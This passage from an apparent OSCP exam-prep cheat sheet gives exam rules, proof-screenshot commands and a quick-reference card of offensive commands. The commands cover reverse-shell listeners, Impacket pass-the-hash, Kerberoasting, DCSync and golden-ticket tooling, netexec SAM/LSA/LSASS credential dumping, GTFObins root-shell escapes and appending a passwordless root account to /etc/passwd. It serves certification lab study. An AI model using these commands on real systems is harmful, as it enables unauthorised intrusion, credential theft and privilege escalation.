1. [ ] Enumeration: gobuster → found /admin
2. [ ] LFI at ?file= parameter → /etc/passwd readable
3. [ ] Log poisoning → RCE as www-data
4. [ ] linpeas → SUID /usr/bin/python3
5. [ ] GTFObins python SUID → root

### Commands Used (copy for report)
...

### Screenshots Taken
- [ ] local.txt with IP + whoami
- [ ] proof.txt with IP + whoami
```

## Critical Exam Rules

> [!abstract] 🌳 Markdown List: Strict Points Protection and Rule Verification Matrix Checklist
> 
> Plaintext
> 
> ```
> ☐ Screenshot format — EVERY flag must include:
>     • cat /root/proof.txt (or type C:\...\proof.txt)
>     • whoami (showing root / NT AUTHORITY\SYSTEM / Administrator)
>     • hostname
>     • ip addr / ipconfig
> 
> ☐ Exact commands for screenshot:
>     Linux:   cat /root/proof.txt && whoami && hostname && ip addr show
>     Windows: type C:\Users\Administrator\Desktop\proof.txt & whoami & hostname & ipconfig /all
> 
> ☐ Metasploit: ONLY 1 MACHINE — choose wisely
>     → If stuck on standalone, use Metasploit there
>     → Don't use on AD (manual AD is better documented anyway)
> 
> ☐ msfvenom: ALLOWED on ALL machines (just payload generation)
> 
> ☐ Screenshot IMMEDIATELY when you get a flag
>     → Don't wait — connection drops happen
> 
> ☐ AD set: flags may be in unusual locations — check:
>     C:\Users\*\Desktop\*.txt
>     C:\Users\*\Documents\*.txt
>     Use: dir /s /b C:\*.txt 2>nul | findstr "local\|proof"
> ```

## Stuck? 15-Point Reset Checklist

> [!abstract] 🌳 Markdown List: Elite Time Window Management and Target Analysis Redirection Checklist
> 
> Plaintext
> 
> ```
> Time limit per vector: 45 minutes. If stuck → STOP → go through this list.
> 
> ☐ 1.  Did full port scan finish? (-p- not just top 1000)
> ☐ 2.  Did UDP scan run? (SNMP=161 especially)
> ☐ 3.  Read ALL web page source code? (Ctrl+U in browser)
> ☐ 4.  Checked robots.txt, /.git, /.env, /backup?
> ☐ 5.  Tried ALL found credentials on ALL services?
> ☐ 6.  Default credentials tried? (admin:admin, admin:password, user:user)
> ☐ 7.  Exact version numbers googled for CVEs?
> ☐ 8.  searchsploit run on every service+version?
> ☐ 9.  All SMB shares checked and files downloaded?
> ☐ 10. SQL injection tested on every input field?
> ☐ 11. LFI tested on every file/page parameter?
> ☐ 12. linpeas/winpeas output fully read? (especially yellow/red)
> ☐ 13. sudo -l, SUID, capabilities, cron all checked?
> ☐ 14. Interesting file search done? (.conf, .bak, history files)
> ☐ 15. Is there a simpler path I'm overthinking?
> ```

## AD-Specific Tips

> [!abstract] 🌳 Markdown List: Enterprise Networks Post-Ingress Pivot Analysis Matrix Checklist
> 
> Plaintext
> 
> ```
> ☐ Start with provided creds → BloodHound FIRST (shows the path)
> ☐ Check ALL user descriptions for passwords (very common in OSCP)
> ☐ Check SYSVOL/GPP within first 10 minutes
> ☐ Kerberoast + AS-REP roast with initial creds immediately
> ☐ Password reuse is extremely common: found hash/pass → spray everywhere
> ☐ BloodHound query "Shortest Path to DA" → follow it literally
> ☐ Any GenericAll/WriteDACL/GenericWrite ACE → exploit immediately
> ☐ Check MSSQL linked servers — lateral movement via SQL is common
> ☐ Check if MSSQL service account has domain privileges
> ☐ netexec/CME --users finds more than BloodHound sometimes
> ☐ After owning MS01 → re-run BloodHound from inside (catches more)
> ```

## Common Rabbit Holes (Avoid These)

> [!abstract] 🌳 Markdown List: Destructive Evasion Traps and Anti-Patterns Checklist
> 
> Plaintext
> 
> ```
> ✗ Kernel exploits before trying any other method
> ✗ SSH brute force with rockyou (10M entries = too slow)
> ✗ Ignoring UDP entirely (SNMP community = creds/usernames)
> ✗ Not trying found creds on every other service
> ✗ Fuzzing for hours when page is static (no dynamic params)
> ✗ Spending >45 min on one attack vector
> ✗ Assuming no MSSQL linked servers without checking
> ✗ Forgetting PS history file (ConsoleHost_history.txt)
> ✗ Not checking web.config / app.config files for DB creds
> ✗ Giving up without trying GTFObins on EVERY SUID binary
> ```

# 14. PROOF COLLECTION CHECKLIST

## Required Screenshot Per Machine

> [!check] 🐧 Linux Bash: Low-Privilege Local Session Environment Configuration Flag Extraction Verification
> 
> Bash
> 
> ```
> cat /home/<USERNAME>/local.txt && whoami && id && hostname && ip addr show
> ```

> [!success] 🐧 Linux Bash: High-Privilege Administrative System Flag Extraction Verification
> 
> Bash
> 
> ```
> cat /root/proof.txt && whoami && id && hostname && ip addr show
> ```

> [!check] 💾 Windows CMD: Low-Privilege User Account Desktop Volatile Flag Extraction Verification
> 
> DOS
> 
> ```
> type C:\Users\<USERNAME>\Desktop\local.txt & whoami & hostname & ipconfig
> ```

> [!success] 💾 Windows CMD: Elevated Context Administrator System Desktop Flag Extraction Verification
> 
> DOS
> 
> ```
> type C:\Users\Administrator\Desktop\proof.txt & whoami & hostname & ipconfig /all
> ```

> [!success] 💾 Windows CMD: System Level Impersonated Handle Full Token Group Mapping Flag Extraction Verification
> 
> DOS
> 
> ```
> type C:\Users\Administrator\Desktop\proof.txt & whoami /all & hostname & ipconfig
> ```

## Proof File Locations Reference

> [!abstract] 🌳 Markdown List: Default Flag Database Storage Paths Matrix Checklist
> 
> Plaintext
> 
> ```
> Linux:
>     /root/proof.txt           ← requires root
>     /home/<user>/local.txt    ← requires user access
> 
> Windows:
>     C:\Users\Administrator\Desktop\proof.txt  ← requires admin/SYSTEM
>     C:\Users\<user>\Desktop\local.txt         ← requires user
>     Also check: Documents, root of C:\
> 
> If not found:
>     Linux:  find / -name "*.txt" 2>/dev/null | xargs grep -l "OS{" 2>/dev/null
>     Windows: dir /s /b C:\local.txt C:\proof.txt 2>nul
>              dir /s /b C:\*.txt 2>nul | findstr "local\|proof"
> ```

## Final Verification Before Ending Exam

> [!abstract] 🌳 Markdown List: Consolidated Grading Vault Matrix and Report Tracking Checklist
> 
> Plaintext
> 
> ```
> POINTS TRACKER:
> ☐ AD MS01  — local.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
> ☐ AD MS02  — local.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
> ☐ AD DC    — proof.txt  = 20 pts  |  Flag: ____________  | Screenshot: ☐
> ☐ Box1     — local.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
> ☐ Box1     — proof.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
> ☐ Box2     — local.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
> ☐ Box2     — proof.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
> ☐ Box3     — local.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
> ☐ Box3     — proof.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
> 
> TOTAL:      /100   |   PASS THRESHOLD: 70
> 
> PRE-REPORT CHECKS:
> ☐ All screenshots show: flag + whoami + hostname + IP
> ☐ Notes detailed enough to recreate each attack step
> ☐ All commands documented for 24hr report
> ☐ No Metasploit used on more than 1 machine
> ☐ Report started / template ready
> ```

# 15. QUICK REFERENCE CARD

## Essential Listeners

> [!abstract] 🐧 Linux Bash: Traditional Inbound Ingress Process Port Standalone Listeners
> 
> Bash
> 
> ```
> nc -lvnp 4444
> ```

> [!abstract] 🐧 Linux Bash: Stabilized Terminal Listener Engine with Local History Readline Processing
> 
> Bash
> 
> ```
> rlwrap nc -lvnp 4444
> ```

> [!abstract] 🐧 Linux Bash: Initializing Background In-Framework Inbound Connection Handlers (Metasploit Multi-Handler)
> 
> Bash
> 
> ```
> msfconsole -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST tun0; set LPORT 4444; run -j"
> ```

## Impacket Cheatsheet

> [!example] 🐧 Linux Bash: Spawning Full SYSTEM Administrative Context Process via SMB Protocols
> 
> Bash
> 
> ```
> psexec.py dom/user:pass@<TARGET_IP>
> ```

> [!example] 🐧 Linux Bash: Semi-Interactive Remote Management Console Thread Execution over WMI Ports
> 
> Bash
> 
> ```
> wmiexec.py dom/user:pass@<TARGET_IP>
> ```

> [!example] 🐧 Linux Bash: Evasive Remote Command Processor Spawning without Executable File Drops
> 
> Bash
> 
> ```
> smbexec.py dom/user:pass@<TARGET_IP>
> ```

> [!example] 🐧 Linux Bash: Spawning One-Off Commands Process Threads via Scheduled Task Automations
> 
> Bash
> 
> ```
> atexec.py dom/user:pass@<TARGET_IP> "whoami"
> ```

> [!example] 🐧 Linux Bash: Remote Authentication Access Validation via Injected User NT Hashes Strings
> 
> Bash
> 
> ```
> psexec.py dom/user@<TARGET_IP> -hashes :<NTLM_HASH>
> wmiexec.py dom/user@<TARGET_IP> -hashes :<NTLM_HASH>
> secretsdump.py dom/user@<TARGET_IP> -hashes :<NTLM_HASH>
> ```

> [!warning] 🐧 Linux Bash: Authenticated Harvesting of Domain SPN Service Ticket Matrices (Kerberoasting Extraction)
> 
> Bash
> 
> ```
> GetUserSPNs.py dom/user:pass -dc-ip <DC_IP> -request
> ```

> [!warning] 🐧 Linux Bash: Requesting Network Ticket Accounts Data Lacking Pre-Authentication Protections (AS-REP Ingestion)
> 
> Bash
> 
> ```
> GetNPUsers.py dom/user:pass -dc-ip <DC_IP> -request
> ```

> [!check] 🐧 Linux Bash: Remote Replication Protocol Replication Ingestion Queries (DCSync Extraction)
> 
> Bash
> 
> ```
> secretsdump.py dom/user:pass@<DC_IP> -just-dc
> ```

> [!check] 🐧 Linux Bash: Harvesting Network Domain User Identity Security Account Manager Signatures (SID Mapping Search)
> 
> Bash
> 
> ```
> lookupsid.py dom/user:pass@<TARGET_IP>
> ```

> [!example] 🐧 Linux Bash: Generating Inbound Domain Compute Accounts Entities inside Active Directory trees
> 
> Bash
> 
> ```
> addcomputer.py dom/user:pass -computer-name FAKE$
> ```

> [!example] 🐧 Linux Bash: Requesting an Impersonated User Token Service Ticket over Network Channels
> 
> Bash
> 
> ```
> getST.py -spn cifs/<TARGET_FQDN> -impersonate Admin dom/user:pass
> ```

> [!example] 🐧 Linux Bash: Creating Persistent Core Enterprise Privilege Elevation Tickets (Golden Ticket Forge Tool)
> 
> Bash
> 
> ```
> ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain dom Admin
> ```

> [!check] 🐧 Linux Bash: Remote Authenticated Inbound Database Ingest Connections (Active Directory Authentication)
> 
> Bash
> 
> ```
> mssqlclient.py dom/user:pass@<TARGET_IP> -windows-auth
> ```

> [!check] 🐧 Linux Bash: Remote Connections Mapping using Local SQL Database Account Credentials
> 
> Bash
> 
> ```
> mssqlclient.py sa@<TARGET_IP>
> ```

## netexec / CME Cheatsheet

> [!check] 🐧 Linux Bash: Broad Range Network Target Access Profile Ingress Credentials Validation Check
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass
> ```

> [!check] 🐧 Linux Bash: Network Ingress Authentication via Pass-The-Hash Account Validation Injections
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -H <NTLM_HASH>
> ```

> [!check] 🐧 Linux Bash: Broad Subnet Range Multi-Account Sprays Tracking Accessible Targets
> 
> Bash
> 
> ```
> nxc smb <SUBNET>/24 -u user -p pass --continue-on-success
> ```

> [!check] 🐧 Linux Bash: Extracting Available Shared Volumes Partition Configurations from Connected Nodes
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass --shares
> ```

> [!check] 🐧 Linux Bash: Indexing Active Directory Enterprise Domain User Accounts Matrices
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass --users
> ```

> [!check] 🐧 Linux Bash: Mapping Corporate Domain Security Groups Relationships Frameworks
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass --groups
> ```

> [!check] 🐧 Linux Bash: Requesting Network Active Password Expiration and Complexity Matrix Policies
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass --pass-pol
> ```

> [!check] 🐧 Linux Bash: Extracting Local Account Databases Hashes directly from Target Registries
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass --sam
> ```

> [!check] 🐧 Linux Bash: Extracting Local Security Authority Cleartext Access Secrets from Target Storage
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass --lsa
> ```

> [!check] 🐧 Linux Bash: Automated In-Memory Extraction of Active Session Plaintext Tokens (LSASS Hijacking Module)
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass -M lsassy
> ```

> [!check] 🐧 Linux Bash: Harvesting Hardcoded Group Policy Preferences Passwords from Domain Configuration Volumes
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass -M gpp_password
> ```

> [!check] 🐧 Linux Bash: Executing Shell Command Processes via Target Operating System Command Interpreters
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass -x "whoami"
> ```

> [!check] 🐧 Linux Bash: Direct In-Memory Script Pipeline Processing via PowerShell Execution Handlers
> 
> Bash
> 
> ```
> nxc smb <TARGET_IP> -u user -p pass -X "whoami"
> ```

> [!check] 🐧 Linux Bash: Testing Inbound Network Access Authorization over Remote WinRM Management Endpoints
> 
> Bash
> 
> ```
> nxc winrm <TARGET_IP> -u user -p pass
> ```

> [!check] 🐧 Linux Bash: Testing Database Target Authentication Ingress over Local SQL Instance Links
> 
> Bash
> 
> ```
> nxc mssql <TARGET_IP> -u sa -p pass --local-auth
> ```

> [!check] 🐧 Linux Bash: Submitting Direct Transact-SQL Statement Queries to Remote Database Engines
> 
> Bash
> 
> ```
> nxc mssql <TARGET_IP> -u sa -p pass -q "SELECT @@version"
> ```

> [!note] 🐧 Linux Bash: Uploading External Binary Payloads through Active Database Service Connections Links
> 
> Bash
> 
> ```
> nxc mssql <TARGET_IP> -u sa -p pass --put-file /tmp/nc.exe C:\\Temp\\nc.exe
> ```

## Key File Locations

> [!info] 🌳 Markdown List: Linux Corporate Node File Partition Key Secrets Repositories Checklist
> 
> Plaintext
> 
> ```
> LINUX — HIGH VALUE:
> /etc/passwd, /etc/shadow             → hashes
> /etc/crontab, /var/spool/cron/       → cron jobs
> /home/*/.bash_history                → command history (GOLD)
> /home/*/.ssh/id_rsa                  → private keys
> /home/*/.ssh/authorized_keys         → can add your pubkey
> /var/www/html/                       → web configs (DB creds!)
> /opt/                                → custom apps
> /tmp/, /dev/shm/                     → writable dirs
> /proc/self/environ                   → environment vars
> ```

> [!info] 🌳 Markdown List: Windows Infrastructure Node File Partition Secrets Vault Locations Checklist
> 
> Plaintext
> 
> ```
> WINDOWS — HIGH VALUE:
> C:\Windows\System32\config\SAM       → local hashes
> C:\Windows\NTDS\ntds.dit             → AD hashes (DC)
> C:\inetpub\wwwroot\web.config        → DB/app creds
> C:\xampp\passwords.txt               → XAMPP creds
> C:\ProgramData\                      → app configs
> C:\Users\*\AppData\Local\Microsoft\Credentials\  → stored creds
> %APPDATA%\...\PSReadLine\ConsoleHost_history.txt  → PS history (GOLD)
> C:\Windows\Panther\unattend.xml      → autologon creds
> C:\Windows\system32\sysprep\sysprep.xml → creds
> ```

## GTFObins Quick Reference

> [!example] 🐧 Linux Bash: Upgrading SUID Process Binary Execution Mappings via System Inherent Find Frameworks
> 
> Bash
> 
> ```
> sudo find . -exec /bin/bash \; -p
> ```

> [!example] 🐧 Linux Bash: Elevating Writable Local Process Privileges via Scripting Engine Command Hooks
> 
> Bash
> 
> ```
> python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
> ```

> [!example] 🐧 Linux Bash: Spawning Privileged Root Terminals via Writable Perl Interpreter Binaries
> 
> Bash
> 
> ```
> perl -e 'exec "/bin/bash"'
> ```

> [!example] 🐧 Linux Bash: Spawning Privileged Root Terminals via Writable Ruby Execution Engines
> 
> Bash
> 
> ```
> ruby -e 'exec "/bin/bash"'
> ```

> [!example] 🐧 Linux Bash: Breaking Process Controls via In-Utility Text Data Stream Pattern Parsers
> 
> Bash
> 
> ```
> awk 'BEGIN {system("/bin/bash")}'
> ```

> [!example] 🐧 Linux Bash: Spawning Privileged Interceptions via Deprecated Legacy Interactive Application Frameworks
> 
> Bash
> 
> ```
> sudo nmap --interactive; !sh  (old nmap <5.20)
> ```

> [!example] 🐧 Linux Bash: Escaping Writable Local Text Editors Configurations back into Active Shell Contexts
> 
> Bash
> 
> ```
> sudo vim -c ':!/bin/bash'
> ```

> [!example] 🐧 Linux Bash: Pager-Based Command Redirection Ingress Shell Breaks out of System Readers
> 
> Bash
> 
> ```
> sudo less /etc/hosts → !/bin/bash
> sudo man man → !/bin/bash
> ```

> [!example] 🐧 Linux Bash: Exploiting Privileged Tar Application Archivers Checkpoint Command Parameter Execution Weaknesses
> 
> Bash
> 
> ```
> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
> ```

> [!example] 🐧 Linux Bash: Spawning Root Process Environments over Writable Structural Environment Core Systems
> 
> Bash
> 
> ```
> sudo env /bin/bash
> ```

> [!example] 🐧 Linux Bash: Appending Arbitrary Root Credentials Records into Protected System Account Mapping Registries
> 
> Bash
> 
> ```
> echo 'root2::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd
> ```

> [!example] 🐧 Linux Bash: Propagating SUID System Binary Elevation Permissions via Privileged Local File Copies
> 
> Bash
> 
> ```
> sudo cp /bin/bash /tmp/; sudo chmod +s /tmp/bash; /tmp/bash -p
> ```

# 🧠 Mental Model

Plaintext

```
Target Environment Identified ➔ Callout Container Language Check ➔ Clean Copy-Paste Execution ➔ Exploit Validated
```